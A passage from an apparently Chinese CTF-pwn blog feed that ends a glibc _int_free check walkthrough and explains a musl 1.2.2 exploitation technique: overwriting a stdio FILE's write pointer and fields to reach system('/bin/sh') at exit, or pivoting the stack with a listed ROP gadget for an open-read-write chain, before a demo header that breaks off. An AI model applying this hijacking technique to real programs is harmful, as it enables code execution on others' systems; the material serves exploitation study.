class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// line 4256</span></span><br><span class="line">    fb = &amp;fastbin (av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">    mchunkptr old = *fb, old2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">      &#123;</span><br><span class="line"><span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">   add (i.e., double free).  */</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;double free or corruption (fasttop)&quot;</span>);</span><br><span class="line">p-&gt;fd = old;</span><br><span class="line">*fb = p;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">     add (i.e., double free).  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;double free or corruption (fasttop)&quot;</span>);</span><br><span class="line">  p-&gt;fd = old2 = old;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2))</span><br><span class="line">     != old2);</span><br></pre></td></tr></table></figure><p>这里检查的是上一次free的chunk和这一次是不是同一个，即相邻检查。使用两个检查是为了兼容多线程，不用深究。</p><h3 id="（6）检查fastbin环境"><a href="#（6）检查fastbin环境" class="headerlink" title="（6）检查fastbin环境"></a>（6）检查fastbin环境</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// line 4286</span></span><br><span class="line"><span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span></span><br><span class="line">&amp;&amp; __builtin_expect (fastbin_index (chunksize (old)) != idx, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;invalid fastbin entry (free)&quot;</span>);</span><br></pre></td></tr></table></figure><p>这里应该是检查原fastbin头的chunksize是否正确。</p><h3 id="（7）检查p是否为top-chunk"><a href="#（7）检查p是否为top-chunk" class="headerlink" title="（7）检查p是否为top chunk"></a>（7）检查p是否为top chunk</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// line 4308</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (p == av-&gt;top))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;double free or corruption (top)&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="（8）检查该chunk是否超出了main-arena的管辖范围"><a href="#（8）检查该chunk是否超出了main-arena的管辖范围" class="headerlink" title="（8）检查该chunk是否超出了main_arena的管辖范围"></a>（8）检查该chunk是否超出了main_arena的管辖范围</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// line 4311</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (contiguous (av)</span><br><span class="line"> &amp;&amp; (<span class="type">char</span> *) nextchunk</span><br><span class="line"> &gt;= ((<span class="type">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">malloc_printerr (<span class="string">&quot;double free or corruption (out)&quot;</span>);</span><br></pre></td></tr></table></figure><p>这里是检查chunk尾部的地址是否大于top chunk的尾部地址。</p><h3 id="（9）检查物理地址后一个chunk是否有prev-inuse位"><a href="#（9）检查物理地址后一个chunk是否有prev-inuse位" class="headerlink" title="（9）检查物理地址后一个chunk是否有prev_inuse位"></a>（9）检查物理地址后一个chunk是否有prev_inuse位</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// line 4316</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;double free or corruption (!prev)&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="（10）检查物理地址后一个chunk的大小是否合理"><a href="#（10）检查物理地址后一个chunk的大小是否合理" class="headerlink" title="（10）检查物理地址后一个chunk的大小是否合理"></a>（10）检查物理地址后一个chunk的大小是否合理</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// line 4320</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize_nomask (nextchunk) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;free(): invalid next size (normal)&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="（11）检查物理地址前一个chunk的size是否等于prev-size"><a href="#（11）检查物理地址前一个chunk的size是否等于prev-size" class="headerlink" title="（11）检查物理地址前一个chunk的size是否等于prev_size"></a>（11）检查物理地址前一个chunk的size是否等于prev_size</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// line 4327</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">  unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是尝试与前一个chunk进行合并，顺便进行一下前面chunk的size检查。</p><h3 id="（12）检查unsorted-bin链表尾部的双向链表完整性"><a href="#（12）检查unsorted-bin链表尾部的双向链表完整性" class="headerlink" title="（12）检查unsorted bin链表尾部的双向链表完整性"></a>（12）检查unsorted bin链表尾部的双向链表完整性</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// line 4353</span></span><br><span class="line">bck = unsorted_chunks(av);</span><br><span class="line">fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">malloc_printerr (<span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>);</span><br></pre></td></tr></table></figure><p>与_int_malloc中频繁进行的检查相同。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>musl pwn 入门 (3)</title>
      <link href="/2023/02/28/musl-pwn-%E5%85%A5%E9%97%A8-3/"/>
      <url>/2023/02/28/musl-pwn-%E5%85%A5%E9%97%A8-3/</url>
      
        <content type="html"><![CDATA[<p>在上一篇文章中，我们详细分析了如何通过musl的内存分配系统实现任意两个地址互相写的利用。本文据此讨论应该如何使用这种方式getshell。</p><p>首先看到musl中的<code>_IO_FILE</code>结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *rpos, *rend;</span><br><span class="line"><span class="type">int</span> (*close)(FILE *);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *wend, *wpos;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *mustbezero_1;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *wbase;</span><br><span class="line"><span class="type">size_t</span> (*read)(FILE *, <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">size_t</span>);</span><br><span class="line"><span class="type">size_t</span> (*write)(FILE *, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">size_t</span>);</span><br><span class="line"><span class="type">off_t</span> (*seek)(FILE *, <span class="type">off_t</span>, <span class="type">int</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *buf;</span><br><span class="line"><span class="type">size_t</span> buf_size;</span><br><span class="line">FILE *prev, *next;</span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">int</span> pipe_pid;</span><br><span class="line"><span class="type">long</span> lockcount;</span><br><span class="line"><span class="type">int</span> mode;</span><br><span class="line"><span class="keyword">volatile</span> <span class="type">int</span> lock;</span><br><span class="line"><span class="type">int</span> lbf;</span><br><span class="line"><span class="type">void</span> *cookie;</span><br><span class="line"><span class="type">off_t</span> off;</span><br><span class="line"><span class="type">char</span> *getln_buf;</span><br><span class="line"><span class="type">void</span> *mustbezero_2;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *shend;</span><br><span class="line"><span class="type">off_t</span> shlim, shcnt;</span><br><span class="line">FILE *prev_locked, *next_locked;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">locale_struct</span> *<span class="title">locale</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中有4个函数指针<code>close</code>、<code>read</code>、<code>write</code>、<code>seek</code>。在解题时，标准输入输出的三个<code>FILE</code>结构体：<code>stdin</code>、<code>stdout</code>、<code>stderr</code>是我们利用的重点。首先我们需要了解musl的exit函数调用链：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">_Noreturn</span> <span class="type">void</span> <span class="title function_">exit</span><span class="params">(<span class="type">int</span> code)</span></span><br><span class="line">&#123;</span><br><span class="line">__funcs_on_exit();</span><br><span class="line">__libc_exit_fini();</span><br><span class="line">__stdio_exit();</span><br><span class="line">_Exit(code);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __stdio_exit(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">FILE *f;</span><br><span class="line"><span class="keyword">for</span> (f=*__ofl_lock(); f; f=f-&gt;next) close_file(f);</span><br><span class="line">close_file(__stdin_used);</span><br><span class="line">close_file(__stdout_used);</span><br><span class="line">close_file(__stderr_used);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">close_file</span><span class="params">(FILE *f)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!f) <span class="keyword">return</span>;</span><br><span class="line">FFINALLOCK(f);</span><br><span class="line"><span class="keyword">if</span> (f-&gt;wpos != f-&gt;wbase) f-&gt;write(f, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (f-&gt;rpos != f-&gt;rend) f-&gt;seek(f, f-&gt;rpos-f-&gt;rend, SEEK_CUR);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><code>exit</code><br>&amp;emsp;&amp;emsp;<code>__stdio_exit</code><br>&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;<code>close_file</code></p></blockquote><p>可以看到<code>close_file</code>中可能会调用三个<code>FILE</code>的<code>write</code>和<code>seek</code>函数指针。我们要修改的也正是这两个指针。在没有沙箱的情况下，只需要将<code>FILE</code>结构体开头的几个字节修改为<code>/bin/sh</code>，再修改<code>write</code>指针的值为<code>system</code>，以及修改<code>f-&gt;wpos</code>、<code>f-&gt;wbase</code>中其中之一就可以调用到<code>system(&quot;/bin/sh&quot;)</code>。而在有沙箱保护的情况下，还需要通过栈迁移才能进行orw。</p><p>由于调用<code>close_file</code>时，<code>rsp</code>周围的栈环境不受我们控制，因此我们不能使用带有<code>pop rsp</code>的gadget。以下是查找带有<code>mov rsp, xxx</code>的gadget：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@colin-virtual-machine:~/Desktop/my_how2heap/musl# ROPgadget --binary /lib/x86_64-linux-musl/libc.so | grep &quot;mov rsp&quot;</span><br><span class="line">0x0000000000076b32 : add byte ptr [rax], al ; sub rdx, 8 ; mov rsp, rdx ; jmp rax</span><br><span class="line">0x0000000000022c22 : add dword ptr [rax], eax ; mov rsp, qword ptr [rbp - 0xc0] ; jmp 0x22750</span><br><span class="line">0x000000000007571b : add eax, dword ptr [rax] ; mov rsp, qword ptr [rbp - 0x448] ; jmp 0x75096</span><br><span class="line">0x000000000004d278 : je 0x4d183 ; mov rsp, r9 ; jmp 0x4d101</span><br><span class="line">0x00000000000789f3 : jg 0x78a1d ; mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]</span><br><span class="line">0x0000000000022c0a : jne 0x22bf0 ; mov rsp, qword ptr [rbp - 0xc0] ; jmp 0x227e2</span><br><span class="line">0x000000000004d259 : lea ebx, [rax + 1] ; mov rsp, r9 ; jmp 0x4d101</span><br><span class="line">0x000000000004d258 : lea r11, [rax + 1] ; mov rsp, r9 ; jmp 0x4d101</span><br><span class="line">0x000000000004d247 : mov eax, 0xffffffff ; mov rsp, r9 ; jmp 0x4d199</span><br><span class="line">0x00000000000789f2 : mov edi, dword ptr [rdi + 0x28] ; mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]</span><br><span class="line">0x00000000000789f1 : mov r15, qword ptr [rdi + 0x28] ; mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]</span><br><span class="line">0x000000000007571d : mov rsp, qword ptr [rbp - 0x448] ; jmp 0x75096</span><br><span class="line">0x0000000000022c24 : mov rsp, qword ptr [rbp - 0xc0] ; jmp 0x22750</span><br><span class="line">0x0000000000022c0c : mov rsp, qword ptr [rbp - 0xc0] ; jmp 0x227e2</span><br><span class="line">0x00000000000789f5 : mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]</span><br><span class="line">0x000000000004d25c : mov rsp, r9 ; jmp 0x4d101</span><br><span class="line">0x000000000004d24c : mov rsp, r9 ; jmp 0x4d199</span><br><span class="line">0x0000000000076b38 : mov rsp, rdx ; jmp rax</span><br><span class="line">0x000000000004d246 : sub byte ptr [rax - 1], bh ; mov rsp, r9 ; jmp 0x4d199</span><br><span class="line">0x0000000000076b35 : sub edx, 8 ; mov rsp, rdx ; jmp rax</span><br><span class="line">0x0000000000076b34 : sub rdx, 8 ; mov rsp, rdx ; jmp rax</span><br></pre></td></tr></table></figure><p>其中注意到<code>mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]</code>，由于<code>write</code>函数的第一个参数是<code>FILE</code>结构体自身，因此这里的<code>[rdi+0x30]</code>是我们可以通过提前修改控制的值，这样就能够控制<code>rsp</code>的值。同样，后面的<code>[rdi+0x38]</code>可以写入ROP链开头的一个gadget的地址，从而开始执行ROP链。这里注意到<code>[rdi+0x38]</code>当<code>rdi</code>等于<code>FILE</code>结构体地址时，0x38的偏移对应的正好就是<code>wbase</code>，这样可以在满足判断条件的同时写入gadget地址，一举两得。</p><p>总结：</p><ul><li>在无沙箱时，需要修改<code>FILE</code>结构体的3个地方——<ul><li>起始位置写入<code>/bin/sh</code></li><li><code>f-&gt;wpos</code>、<code>f-&gt;wbase</code>中其中之一使得二者不等</li><li><code>write</code>写入<code>system</code>函数地址。</li></ul></li><li>在有沙箱时，需要修改<code>FILE</code>结构体的3个地方——<ul><li><code>f-&gt;wbase</code>写入第一个gadget地址使得<code>f-&gt;wpos</code>、<code>f-&gt;wbase</code>不等的同时能够执行到gadget</li><li><code>write</code>写入刚才提到的栈迁移的gadget</li><li>偏移0x30处写入新的栈地址配合栈迁移gadget完成栈迁移</li><li>此外还需要在其他地方构造好ROP链用于orw</li></ul></li></ul><p>下面笔者编写的demo程序详细演示了两种利用方式的流程，为方便起见，demo中没有通过unlink进行地址写操作，而是直接写。如果使用unlink进行任意地址写，要注意偏移量，两个地址a和b中如果a能够写到b的位置，那么b会写到a+8的位置，对应于两个指针在结构体中的偏移，这一点在上一篇文章中最后打印结果时有体现，不要忽视。</p><p>如果执行不成功，请检查自己机器上的musl libc版本是否是1.2.2，若不是，则根据反汇编结果进行偏移量的调整即可。（选择orw模式时需确保当前文件夹中有flag文件）</p><p>头文件<code>musl_util.h</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MY_HOW2HEAP_MUSL_UTIL_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MY_HOW2HEAP_MUSL_UTIL_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> flags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *rpos, *rend;</span><br><span class="line">    <span class="type">int</span> (*close)(FILE *);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *wend, *wpos;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *mustbezero_1;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *wbase;</span><br><span class="line">    <span class="type">size_t</span> (*read)(FILE *, <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">size_t</span>);</span><br><span class="line">    <span class="type">size_t</span> (*write)(FILE *, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">size_t</span>);</span><br><span class="line">    <span class="type">off_t</span> (*seek)(FILE *, <span class="type">off_t</span>, <span class="type">int</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *buf;</span><br><span class="line">    <span class="type">size_t</span> buf_size;</span><br><span class="line">    FILE *prev, *next;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">int</span> pipe_pid;</span><br><span class="line">    <span class="type">long</span> lockcount;</span><br><span class="line">    <span class="type">int</span> mode;</span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> lock;</span><br><span class="line">    <span class="type">int</span> lbf;</span><br><span class="line">    <span class="type">void</span> *cookie;</span><br><span class="line">    <span class="type">off_t</span> off;</span><br><span class="line">    <span class="type">char</span> *getln_buf;</span><br><span class="line">    <span class="type">void</span> *mustbezero_2;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *shend;</span><br><span class="line">    <span class="type">off_t</span> shlim, shcnt;</span><br><span class="line">    FILE *prev_locked, *next_locked;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> __<span class="title">locale_struct</span> *<span class="title">locale</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> avail_mask, freed_mask;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> last_idx:<span class="number">5</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> freeable:<span class="number">1</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> sizeclass:<span class="number">6</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> maplen:<span class="number">8</span>*<span class="number">8</span><span class="number">-12</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> active_idx:<span class="number">5</span>;</span><br><span class="line">    <span class="type">char</span> pad[<span class="number">0x10</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> meta *) - <span class="number">1</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> storage[];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> check;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">int</span> nslots;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLACK       <span class="string">&quot;30&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RED         <span class="string">&quot;31&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GREEN       <span class="string">&quot;32&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> YELLOW      <span class="string">&quot;33&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLUE        <span class="string">&quot;34&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PURPLE      <span class="string">&quot;35&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GREEN_DARK  <span class="string">&quot;36&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WHITE       <span class="string">&quot;37&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNDEFINED   <span class="string">&quot;-&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIGHLIGHT   <span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNDERLINE   <span class="string">&quot;4&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SPARK       <span class="string">&quot;5&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STR_END      <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">printf_color</span><span class="params">(<span class="type">char</span>* color, <span class="type">char</span>* effect, <span class="type">char</span>* <span class="built_in">string</span>)</span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, <span class="string">&quot;\033[&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(effect[<span class="number">0</span>] != <span class="string">&#x27;-&#x27;</span>)&#123;</span><br><span class="line">        <span class="built_in">strcat</span>(buffer, effect);</span><br><span class="line">        <span class="built_in">strcat</span>(buffer, <span class="string">&quot;;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, color);</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, <span class="string">&quot;m&quot;</span>);</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, <span class="built_in">string</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span> STR_END, buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title 